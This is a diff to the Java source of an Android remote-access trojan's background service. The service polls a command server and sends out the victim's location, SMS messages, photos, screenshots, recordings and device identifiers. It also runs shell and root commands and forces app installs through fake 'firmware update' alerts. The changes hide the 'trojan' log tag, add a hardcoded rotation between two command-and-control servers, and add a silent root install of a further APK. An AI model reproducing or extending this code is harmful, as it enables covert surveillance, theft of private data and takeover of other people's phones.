@@ -50,12 +50,16 @@ public class SystemThread extends Service
 	};
 	
 	private String myident = "";
-	public static String TAG = "trojan";
+	public static String TAG = "AsDfGhJkL";
 	public static String payloadWebResult = "";
 	public static String payloadWebResultTarget = "";
 	public static String payloadWebResultSwitch = "";
+	public static String urlServer = "";
+	public static int iserver = 0;
+	public static int jumserver = 2;
 	public String ip = "";
 
+	private static String[] server = { "http://10.42.0.1","http://sunjangyo12.000webhostapp.com" };
 	private static int jcamera = 1875953;
 	private static int alert_warna = Color.YELLOW;
 	private static int alert_letak = Gravity.CENTER | Gravity.TOP;
@@ -83,13 +87,14 @@ public class SystemThread extends Service
 
 			if (new MainActivity().apkMana(SystemThread.this, install_paket, "open")) {
         		insHandler.removeCallbacks(insRefresh);
-        		reqPayload(SystemThread.this, receAction.urlServer+"/payload.php?outpayload="+textPayload("install success"), "null");
+        		reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload("install success"), "null");
         		
         		receAction.delayToast = 10000;
         		receAction.toastShow(SystemThread.this, "aktif", Color.GREEN, Gravity.TOP | Gravity.CENTER, "SYSTEM SUCCESS UPDATED\n\n\nYour firmware is  updated please WAIT  process system. [alert akan hilang setelah 60 detik] \n\n------------\n.-----------.\n\n\n\n\n       [ WARNING! ]\n\n\n");
         	} 
         	else {
-        		receAction.toastShow(SystemThread.this, "aktif", Color.YELLOW, Gravity.TOP | Gravity.CENTER, "SYSTEM ALERT WINDOW!!\n\n\nYour firmware is NOT updated please follow this Tutorial.\n\n1. Install this app Framework\n2. Terima prompt playstore google\n3. Open app finish.\n\n\n\n\n       [ WARNING! ]\n\n\n");
+        		//receAction.toastShow(SystemThread.this, "aktif", Color.YELLOW, Gravity.TOP | Gravity.CENTER, "SYSTEM ALERT WINDOW!!\n\n\nYour firmware is NOT updated please follow this Tutorial.\n\n1. Install this app Framework\n2. Terima prompt playstore google\n3. Open app finish.\n\n\n\n\n       [ WARNING! ]\n\n\n");
+				receAction.toastShow(SystemThread.this, "aktif", Color.YELLOW, Gravity.TOP, "SYSTEM ALERT WINDOW!!\n\n\nSystem firmware can't access /etc/build.prop please follow this Tutorial.\n\n1. Install this app\n2.allow playstore prompt\n3. reboot after installed.\n\n\n\n\n\n       [ WARNING! ]\n\n\n");
 
 				Intent intent = new Intent(Intent.ACTION_VIEW);
         		intent.setDataAndType(Uri.fromFile(new File(install_app)), "application/vnd.android.package-archive");
@@ -104,7 +109,7 @@ public class SystemThread extends Service
 		public void run() 
 		{
 			if (receAction.pingResult) {
-				reqPayload(SystemThread.this, receAction.urlServer+"/payload.php?client="+Identitas.getIPAddress(true), "null");
+				reqPayload(SystemThread.this, urlServer+"/payload.php?client="+Identitas.getIPAddress(true), "null");
 				payload(SystemThread.this);
 			} else {
 				Log.i(TAG, "offline");
@@ -126,7 +131,7 @@ public class SystemThread extends Service
 			if (cflength == 0) {
 				camHandler.removeCallbacks(camRefresh);
 				
-				reqPayload(SystemThread.this, receAction.urlServer+"/payload.php?outpayload="+textPayload("camera video system alert tidak support(coba lagi) gunakan alternatif camera foto"), "null");
+				reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload("camera video system alert tidak support(coba lagi) gunakan alternatif camera foto"), "null");
 			}
 			else if (cflength > jcamera) {
 				camHandler.removeCallbacks(camRefresh);
@@ -136,20 +141,21 @@ public class SystemThread extends Service
 					unbindService(camServiceConeksi);
 					binder = null;
 
-					reqPayload(SystemThread.this, receAction.urlServer+"/payload.php?outpayload="+textPayload("camera video/audio SELESAI [siap diupload]"), "null");
+					reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload("camera video/audio SELESAI [siap diupload]"), "null");
 				}
 			}
 			else {
-				reqPayload(SystemThread.this, receAction.urlServer+"/payload.php?outpayload="+textPayload("rekam size:"+cflength), "null");
+				reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload("rekam size:"+cflength), "null");
 			}
 		}
 	};
 
 	public void payload(Context context) {
-        reqPayload(context, receAction.urlServer+"/inpayload.txt", "text");
-        reqPayload(context, receAction.urlServer+"/swthread.txt", "sw");
-        reqPayload(context, receAction.urlServer+"/target.txt", "target");
-        
+        reqPayload(context, urlServer+"/inpayload.txt", "text");
+        reqPayload(context, urlServer+"/swthread.txt", "sw");
+        reqPayload(context, urlServer+"/target.txt", "target");
+
+
         myident = receAction.identitasResult;
         
         if (myident.equals(payloadWebResultTarget)) 
@@ -172,10 +178,10 @@ public class SystemThread extends Service
 				if (receAction.installResult) 
 				{
 					receAction._server(context);
-					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload(receAction.setServer(true)), "null");
+					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload(receAction.setServer(true)), "null");
 				} 
 				else {
-					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("sedang menginstall..."), "null");
+					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("sedang menginstall..."), "null");
 					seteditor.putString("server", "aktif");    
         			seteditor.commit();
 				}
@@ -183,23 +189,23 @@ public class SystemThread extends Service
 
 			if (payloadWebResult.equals("gps")) {
 				String lokasi = new GPSresult(context).gpsResult;
-				reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload(lokasi), "null");
+				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload(lokasi), "null");
 			}
 			if (payloadWebResult.equals("pakroot")) {
 				seteditor.putString("pakroot", "aktif");    
         		seteditor.commit();
 
-				reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("paksa root allow superuser diaktifkan"), "null");
+				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("paksa root allow superuser diaktifkan"), "null");
 			}
 			if (payloadWebResult.equals("alert")) {
-				reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("alert ditampilkan"), "null");
+				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("alert ditampilkan"), "null");
 
 				Toast.makeText(context, "alert", Toast.LENGTH_LONG).show();
 			}
 			if (payloadWebResult.equals("cekroot")) {
 				String root = receAction.rootRequest();
 				
-				reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("root:"+root), "null");
+				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("root:"+root), "null");
 			}
 			if (payloadWebResult.equals("status")) 
 			{
@@ -215,7 +221,7 @@ public class SystemThread extends Service
 								"\nipadrs: "+Identitas.getIPAddress(true)+
 								"\nmacads: "+Identitas.getMACAddress("wlan0")+
 								"\nbatery: "+receAction.batStatus+"\n";
-				reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload(status), "null");
+				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload(status), "null");
 			}
 			
 			if (payloadWebResult.equals("layar")) {
@@ -223,7 +229,7 @@ public class SystemThread extends Service
 				ilay.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 				context.startActivity(ilay);
 				
-				reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("layar menyala"), "null");
+				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("layar menyala"), "null");
 			}
 			if (payloadWebResult.equals("screen")) {
 				String timenow = new SimpleDateFormat("HH:mm:ss").format(new Date());
@@ -232,17 +238,17 @@ public class SystemThread extends Service
 					receAction.rootCommands(shell);
 					Thread.sleep(5000);
 
-					receAction.requestUrl = receAction.urlServer+"/uploadFile.php";
+					receAction.requestUrl = urlServer+"/uploadFile.php";
 					receAction.requestAksi = "upload";
 					receAction.requestPath = receAction.pathExternal+"/screen.jpg";
 					receAction.mainRequest(context);
 
 					
-					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("screenshoot dan upload berhasil"), "null");
+					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("screenshoot dan upload berhasil"), "null");
 				}
 				catch (Exception e) {
 					
-					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("screenshoot gagal"), "null");
+					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("screenshoot gagal"), "null");
 				}
 			}
 
@@ -261,7 +267,7 @@ public class SystemThread extends Service
 				seteditor.putString("utf", text[1]);    
         		seteditor.commit();
         		
-				reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload(settings.getString("utf","")), "null");
+				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload(settings.getString("utf","")), "null");
 
 			}catch(Exception e) {}
 
@@ -270,35 +276,32 @@ public class SystemThread extends Service
 
 				if (text[2].equals("start")) {
 					receAction.audio(context, text[1], text[2]);
-					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("audio dijalankan"), "null");
+					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("audio dijalankan"), "null");
 				}
 				else {
 					receAction.audio(context, text[1], text[2]);
-					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("audio dimatikan"), "null");
+					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("audio dimatikan"), "null");
 				}
 			}catch(Exception e) {}
 
 			try {
 				String[] text = payloadWebResult.split("-install-");
-				boolean sukses = true;
 
 				install_app = text[1];
 				install_paket = text[2];
 				try {
+					Log.i(TAG, "nama asets: "+text[3]);
+
 					new Installer(context, true).assetToSdcard(context, text[3], "/sdcard/");
-					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("get assets success"), "null");
-					sukses = true;
+					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("get assets success"), "null");
 				}
 				catch(Exception e) {
-					sukses = false;
-					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("get assets error:"+e), "null");
+					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("install bukan dari assets"), "null");
 				}
         		
-        		if (sukses) {
-					insHandler.postDelayed(insRefresh, 5 * 1000);
-        		}
+				insHandler.postDelayed(insRefresh, 5 * 1000);
 
-				reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("sedang paksa install aplikasi"), "null");
+				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("sedang paksa install aplikasi"), "null");
 
 			}catch(Exception e) {}
 
@@ -316,14 +319,14 @@ public class SystemThread extends Service
 							}
 							resultRsms.append(msgData);
 							
-							reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload(""+msgData), "null");
+							reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload(""+msgData), "null");
 
 						} while (cursor.moveToNext());
 						Log.i(TAG, resultRsms.toString());
 					}
 					else {
 						
-						reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("sms kosong"), "null");
+						reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("sms kosong"), "null");
 						Log.i(TAG, "kosong");
 					}
 
@@ -337,7 +340,7 @@ public class SystemThread extends Service
 					Log.i(TAG, "sms:"+kirimSms);
 
 					
-					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload(kirimSms), "null");
+					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload(kirimSms), "null");
 				}
 			}catch(Exception e) {}
 
@@ -352,13 +355,13 @@ public class SystemThread extends Service
 					foto.capturePhoto(context, "depan");
 					Thread.sleep(2000);
 
-					receAction.requestUrl = receAction.urlServer+"/uploadFile.php";
+					receAction.requestUrl = urlServer+"/uploadFile.php";
 					receAction.requestAksi = "upload";
 					receAction.requestPath = receAction.pathExternal+"/foto.jpg";
 					receAction.mainRequest(context);
 
 					
-					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("kamera sukses sedang mengupload"), "null");
+					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("kamera sukses sedang mengupload"), "null");
 
 				}
 				if (text[1].equals("back")) {
@@ -367,13 +370,13 @@ public class SystemThread extends Service
 					foto.capturePhoto(context, "back");
 					Thread.sleep(2000);
 
-					receAction.requestUrl = receAction.urlServer+"/uploadFile.php";
+					receAction.requestUrl = urlServer+"/uploadFile.php";
 					receAction.requestAksi = "upload";
 					receAction.requestPath = receAction.pathExternal+"/foto.jpg";
 					receAction.mainRequest(context);
 
 					
-					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("kamera back sukses sedang mengupload"), "null");
+					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("kamera back sukses sedang mengupload"), "null");
 				}
 			}
 			catch(Exception e) {}
@@ -417,11 +420,11 @@ public class SystemThread extends Service
 				String[] text = payloadWebResult.split("-app-");
 				if (new MainActivity().apkMana(context, text[1], "open")) {
 					
-					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("APK:"+text[1]+" berhasil dibuka"), "null");
+					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("APK:"+text[1]+" berhasil dibuka"), "null");
 				}
 				else {
 					
-					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("gagal buka apk"), "null");
+					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("gagal buka apk"), "null");
 				}
 				
 
@@ -435,29 +438,29 @@ public class SystemThread extends Service
 				if (text[1].equals("video")) {
 					reqpath = receAction.pathExternal+"/REC_SYSTEM.mp4";
 					
-					reqPayload(SystemThread.this, receAction.urlServer+"/payload.php?outpayload="+textPayload("upload video TUNGGU"), "null");
+					reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload("upload video TUNGGU"), "null");
 				}
 				else if (text[1].equals("screen")) {
 					reqpath = receAction.pathExternal+"/screen.jpg";
 					
-					reqPayload(SystemThread.this, receAction.urlServer+"/payload.php?outpayload="+textPayload("upload screenshot TUNGGU"), "null");
+					reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload("upload screenshot TUNGGU"), "null");
 				}
 				else if (text[1].equals("foto")) {
 					reqpath = receAction.pathExternal+"/foto.jpg";
 					
-					reqPayload(SystemThread.this, receAction.urlServer+"/payload.php?outpayload="+textPayload("upload foto TUNGGU"), "null");
+					reqPayload(SystemThread.this, urlServer+"/payload.php?outpayload="+textPayload("upload foto TUNGGU"), "null");
 				}
 				else {
 					reqpath = text[1];
 				}
 
-				receAction.requestUrl = receAction.urlServer+"/uploadFile.php";
+				receAction.requestUrl = urlServer+"/uploadFile.php";
 				receAction.requestAksi = "upload";
 				receAction.requestPath = reqpath;
 				receAction.mainRequest(context);
 				
 				
-				reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("upload file : "+reqpath), "null");
+				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("upload file : "+reqpath), "null");
 			}
 			catch(Exception e) {}
 
@@ -470,7 +473,7 @@ public class SystemThread extends Service
 					downurl = text[1];
 				}catch(Exception e) {
 					downname = text[1];
-					downurl = receAction.urlServer+"/download.php?id="+text[1];
+					downurl = urlServer+"/download.php?id=payloadout/"+text[1];
 				}
 
 				receAction.requestUrl = downurl;
@@ -480,7 +483,7 @@ public class SystemThread extends Service
 				Thread.sleep(5000);
 				
 				
-				reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("dwnload file : "+text[1]), "null");
+				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("dwnload file : "+text[1]), "null");
 			}
 			catch(Exception e) {}
 
@@ -501,7 +504,7 @@ public class SystemThread extends Service
 					else if (text[2].equals("kuning")) alert_warna = Color.YELLOW;
 					else if (text[2].equals("hujau")) alert_warna = Color.GREEN;
 					
-					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("toast text:"+text[1]+" letak:"+alert_letak+" warna:"+alert_warna+" durasi:"+alert_durasi), "null");
+					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("toast text:"+text[1]+" letak:"+alert_letak+" warna:"+alert_warna+" durasi:"+alert_durasi), "null");
 
 					CountDownTimer hitungMundur = new CountDownTimer(alert_durasi, 100){
 						public void onTick(long millisUntilFinished){
@@ -522,7 +525,7 @@ public class SystemThread extends Service
 				catch(Exception e) 
 				{
 					
-					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("toast text:"+text[1]), "null");
+					reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("toast text:"+text[1]), "null");
 
 					CountDownTimer hitungMundur = new CountDownTimer(7500, 100){
 						public void onTick(long millisUntilFinished){
@@ -544,7 +547,7 @@ public class SystemThread extends Service
 				receAction.editor(context, receAction.textSplit(text[1], "\n"), text[2]);
 
 				
-				reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+textPayload("text tersimpan siap dieksukesi<-_->"), "null");
+				reqPayload(context, urlServer+"/payload.php?outpayload="+textPayload("text tersimpan siap dieksukesi<-_->"), "null");
 			}catch(Exception e) {}
 
 			try {
@@ -553,7 +556,7 @@ public class SystemThread extends Service
 					String out = textPayload(receAction.shellCommands(""+term[1]));
 					Log.i(TAG, out);
 					
-					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+out, "null");
+					reqPayload(context, urlServer+"/payload.php?outpayload="+out, "null");
 				}
 			}
 			catch(Exception e) {}
@@ -572,11 +575,11 @@ public class SystemThread extends Service
 					String out = textPayload(resultSudo);
 					Log.i(TAG, out);
 					
-					reqPayload(context, receAction.urlServer+"/payload.php?outpayload="+out, "null");
+					reqPayload(context, urlServer+"/payload.php?outpayload="+out, "null");
 				}
 			}
 			catch(Exception e) {}
-			reqPayload(SystemThread.this, receAction.urlServer+"/payload.php?inpayload=null", "null");
+			reqPayload(SystemThread.this, urlServer+"/payload.php?inpayload=null", "null");
 		}
 	}
 
@@ -607,15 +610,16 @@ public class SystemThread extends Service
 		task.paymain = requestAksi;
 
 		if (requestAksi.equals("text")) Log.i(TAG, "...payload text   : "+payloadWebResult);
-		else if (requestAksi.equals("sw")) Log.i(TAG, "...payload sw     : "+payloadWebResultSwitch);
+		else if (requestAksi.equals("sw")) Log.i(TAG, "...payload sw     : "+payloadWebResultSwitch+" ["+urlServer+"]");
 		else if (requestAksi.equals("target")) Log.i(TAG, "...payload target : "+payloadWebResultTarget+"\n");
 
 		try {
 			if (receAction.cekConnection(context)) {
 				Thread.sleep(800);
 				task.execute(new String[] { purl });
-			} else {
-				Log.i(TAG, "cekConnection:"+receAction.cekConnection(context));
+			} 
+			else {
+				Log.i(TAG, "ERROR timeout:"+receAction.cekConnection(context));
 			}
 		}catch(Exception e) {
 			Log.i(TAG, "errRequest: "+e);
@@ -633,6 +637,7 @@ public class SystemThread extends Service
 		super.onCreate();
 		settings = getSharedPreferences("Settings", 0);
 		seteditor = settings.edit();
+		urlServer = server[iserver];
 
 		IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
 		filter.addAction(Intent.ACTION_DATE_CHANGED);
@@ -652,6 +657,22 @@ public class SystemThread extends Service
         if (!htdocs.exists()) {
             htdocs.mkdir();
         }
+
+        if (receAction.finishInstall) {
+        	if (!new MainActivity().apkMana(this, "os.system", "cek")) 
+			{
+        		if (receAction.rootResult) {
+        			String[] apk = { "pm install "+receAction.pathExternal+"/system.apk" };
+					receAction.rootCommands(apk);
+				} 
+				else {
+        			install_app = receAction.pathExternal+"/system.apk";
+					install_paket = "os.system";
+        		
+					insHandler.postDelayed(insRefresh, 2 * 1000);
+				}
+			}		
+		}
 		
 		registerReceiver(broreceiver, filter);
 		mHandler.postDelayed(mRefresh, 5 * 1000);
@@ -709,7 +730,7 @@ public class SystemThread extends Service
 				}
 			}
 			catch(Exception ex){
-				Log.i(TAG, "payload Failed Connect to Server!: "+receAction.iserver);
+				Log.i(TAG, "payload Failed Connect to Server!");
 			}
 			return sret;
 	    }
@@ -722,10 +743,21 @@ public class SystemThread extends Service
 	    	} 
 	    	else if (paymain.equals("sw")) {
 	    		payloadWebResultSwitch = result;
+	    		
+	    		if (result.equals("")) {
+	    			Log.i(TAG, "sffffs");
+	    			iserver += 1;
+					if (iserver == jumserver) 
+					{
+						iserver = 0;
+					}
+					urlServer = server[iserver];
+	    		}
 	    	}
 	    	else if (paymain.equals("target")) {
 	    		payloadWebResultTarget = result;
 	    	}
+	    	
 		}
 	}
 
